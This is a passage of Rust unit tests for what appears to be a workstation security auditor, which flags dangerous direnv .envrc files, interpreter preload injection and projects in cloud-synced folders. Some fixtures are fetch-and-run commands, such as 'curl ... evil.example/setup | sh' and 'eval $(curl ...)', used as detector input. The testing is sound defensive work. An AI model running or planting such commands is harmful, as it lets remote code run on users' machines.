            ControlStatus::Failed
        );
    }

    fn allow(home: &Path, envrc: &Path) {
        let allow_dir = home.join(".local/share/direnv/allow");
        fs::create_dir_all(&allow_dir).unwrap();
        let canonical = fs::canonicalize(envrc).unwrap();
        fs::write(
            allow_dir.join("hash1"),
            format!("{}\n", canonical.display()),
        )
        .unwrap();
    }

    #[test]
    fn direnv_states() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().join("proj");
        fs::create_dir(&root).unwrap();
        let mut report = report_with_home(dir.path());
        report.roots = vec![root.clone()];

        // No .envrc anywhere.
        assert_eq!(
            direnv_auto_exec(&ctx(&report)).status,
            ControlStatus::NotApplicable
        );

        // A dangerous .envrc that is not allowed passes, with a warning row.
        let envrc = root.join(".envrc");
        fs::write(&envrc, "curl -s https://evil.example/setup | sh\n").unwrap();
        let result = direnv_auto_exec(&ctx(&report));
        assert_eq!(result.status, ControlStatus::Passed);
        assert!(
            result
                .evidence
                .iter()
                .any(|row| row.summary.contains("will prompt"))
        );

        // The same file, allowed, fails.
        allow(dir.path(), &envrc);
        let result = direnv_auto_exec(&ctx(&report));
        assert_eq!(result.status, ControlStatus::Failed);
        assert!(result.evidence[0].summary.contains("allowed .envrc"));

        // An allowed but benign .envrc is Partial: still an execution surface.
        fs::write(&envrc, "export FOO=bar\nuse flake\n").unwrap();
        allow(dir.path(), &envrc);
        assert_eq!(
            direnv_auto_exec(&ctx(&report)).status,
            ControlStatus::Partial
        );
    }

    #[test]
    fn envrc_danger_shapes() {
        assert!(envrc_danger("PATH_add bin\n").is_some());
        assert!(envrc_danger("export PATH=$PWD/tools:$PATH\n").is_some());
        assert!(envrc_danger("source ./scripts/env.sh\n").is_some());
        assert!(envrc_danger("eval \"$(curl -s https://x)\"\n").is_some());
        assert!(envrc_danger("export DATABASE_URL=postgres://localhost/dev\n").is_none());
        // direnv stdlib idioms are not repo scripts.
        assert!(envrc_danger("use flake\nlayout python\nwatch_file flake.nix\n").is_none());
        assert!(envrc_danger("source_up\n").is_none());
    }

    #[test]
    fn interpreter_injection_states() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().join("proj");
        fs::create_dir(&root).unwrap();
        let mut report = report_with_home(dir.path());
        report.roots = vec![root.clone()];

        // Nothing to inspect at all.
        assert_eq!(
            interpreter_injection(&ctx(&report)).status,
            ControlStatus::NotApplicable
        );

        // A clean rc is a surface that passes (the baseline invariant).
        fs::write(dir.path().join(".bashrc"), "export EDITOR=hx\n").unwrap();
        assert_eq!(
            interpreter_injection(&ctx(&report)).status,
            ControlStatus::Passed
        );

        // NODE_OPTIONS preload in the rc fails.
        fs::write(
            dir.path().join(".bashrc"),
            "export NODE_OPTIONS=\"--require /tmp/x.js\"\n",
        )
        .unwrap();
        assert_eq!(
            interpreter_injection(&ctx(&report)).status,
            ControlStatus::Failed
        );

        // A planted sitecustomize.py in a project venv fails.
        fs::write(dir.path().join(".bashrc"), "export EDITOR=hx\n").unwrap();
        let site_packages = root.join(".venv/lib/python3.12/site-packages");
        fs::create_dir_all(&site_packages).unwrap();
        fs::write(site_packages.join("sitecustomize.py"), "print('hi')\n").unwrap();
        let result = interpreter_injection(&ctx(&report));
        assert_eq!(result.status, ControlStatus::Failed);
        assert!(result.evidence[0].summary.contains("sitecustomize.py"));

        // Standard-tooling .pth files are allowlisted; import-carrying ones are not.
        fs::remove_file(site_packages.join("sitecustomize.py")).unwrap();
        fs::write(
            site_packages.join("_virtualenv.pth"),
            "import _virtualenv\n",
        )
        .unwrap();
        assert_eq!(
            interpreter_injection(&ctx(&report)).status,
            ControlStatus::Passed
        );
        fs::write(site_packages.join("evil.pth"), "import evil_module\n").unwrap();
        assert_eq!(
            interpreter_injection(&ctx(&report)).status,
            ControlStatus::Failed
        );
    }

    #[test]
    fn pythonpath_into_repo_is_flagged() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().join("proj");
        fs::create_dir(&root).unwrap();
        fs::write(
            dir.path().join(".bashrc"),
            format!("export PYTHONPATH={}/vendored\n", root.display()),
        )
        .unwrap();
        let mut report = report_with_home(dir.path());
        report.roots = vec![root];
        assert_eq!(
            interpreter_injection(&ctx(&report)).status,
            ControlStatus::Failed
        );
    }

    #[test]
    fn cloud_synced_states() {
        let dir = tempfile::tempdir().unwrap();
        let synced_project = dir.path().join("Dropbox/proj");
        fs::create_dir_all(&synced_project).unwrap();
        let outside = dir.path().join("code/proj");
        fs::create_dir_all(&outside).unwrap();

        // Outside every synced tree: Passed.
        let mut report = report_with_home(dir.path());
        report.roots = vec![outside];
        assert_eq!(cloud_synced(&ctx(&report)).status, ControlStatus::Passed);

        // Inside a synced tree without a secret finding: Partial.
        let mut report = report_with_home(dir.path());
        report.roots = vec![synced_project.clone()];
        assert_eq!(cloud_synced(&ctx(&report)).status, ControlStatus::Partial);

        // A secret finding inside the synced project escalates to Failed.
        report.findings.push(
            crate::model::Finding::from_rule("secret-exposed")
                .id("t3")
                .at(synced_project.join(".env"), Some(1)),
        );
        let result = cloud_synced(&ctx(&report));
        assert_eq!(result.status, ControlStatus::Failed);
        assert_eq!(result.finding_ids, vec!["t3".to_string()]);
        assert!(result.evidence[0].summary.contains("rotate"));
    }
}
